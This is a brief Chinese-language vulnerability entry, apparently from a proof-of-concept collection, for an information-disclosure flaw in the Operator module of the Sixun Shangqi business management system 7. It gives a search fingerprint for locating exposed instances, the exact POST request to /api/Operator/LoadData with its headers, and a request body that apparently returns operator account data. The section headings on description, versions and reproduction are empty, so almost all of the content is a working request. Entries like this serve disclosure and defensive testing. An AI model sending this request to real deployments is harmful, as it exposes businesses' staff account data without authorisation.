# 思迅商旗商业管理系统7Operator存在信息泄露漏洞

- **系统**：思迅商旗商业管理系统7Operator　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app.name=="思迅商旗"`
- **请求**：`POST /api/Operator/LoadData HTTP/1.1`
- **关键头**：`Content-Length: 68`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
loadAll=false&oper_role=&field=&operator=&value=1001&gridFlag=OperatorList&page=1&rows=10
```

**其他**
- 思迅商旗商业管理系统7 Operator存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 思迅商旗商业管理系统7